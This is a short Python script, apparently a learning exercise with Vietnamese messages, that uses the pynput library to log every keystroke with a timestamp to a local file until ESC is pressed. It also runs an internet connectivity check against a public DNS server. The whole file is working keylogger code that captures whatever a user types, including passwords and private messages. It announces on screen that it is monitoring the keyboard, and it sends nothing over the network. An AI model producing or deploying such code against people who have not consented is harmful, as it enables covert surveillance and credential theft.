import socket
from pynput import keyboard
import datetime 

log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        timestamp = datetime.datetime.now().strftime("%y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} - {key}\n")

def on_press(key):
    # điều kiện thoát
    if key == keyboard.Key.esc:
        return False
    try: 
        write_to_file(key.char)
    except AttributeError:
       write_to_file(str(key))

def check_internet(host="8.8.8.8", port=53, timeout=3):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except Exception:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    if check_internet():
        print("Đang theo dõi bàn phím ... (nhẫn ESC để dừng)")
    else:
        print("Không có kết nối internet!")
    listener.join() 
